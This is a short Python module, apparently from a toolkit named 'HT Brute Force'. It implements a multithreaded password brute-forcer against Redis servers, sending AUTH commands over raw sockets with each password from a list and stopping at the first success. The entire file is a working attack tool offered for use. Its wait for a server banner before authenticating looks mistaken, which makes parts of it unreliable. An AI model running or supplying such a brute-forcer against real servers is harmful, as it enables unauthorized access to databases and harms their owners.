"""HT Brute Force — Redis brute force.
Redis AUTH command is a simple password check (no username).
"""
import socket, time, threading, queue

class RedisBruter:
    def __init__(self, timeout=10, max_threads=10, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _try_auth(self, host, port, passwd):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            s.recv(1024)  # banner
            s.send(f"*2\r\n$4\r\nAUTH\r\n${len(passwd)}\r\n{passwd}\r\n".encode())
            resp = s.recv(1024)
            elapsed = time.time() - t0
            s.close()
            if b"+OK" in resp or b"+PONG" in resp:
                return {"password": passwd, "time_s": round(elapsed, 2)}
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}

    def run(self, host, port, passwords):
        q = queue.Queue()
        for p in passwords:
            q.put((p,))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    (p,) = q.get_nowait()
                except Exception:
                    break
                r = self._try_auth(host, port, p)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results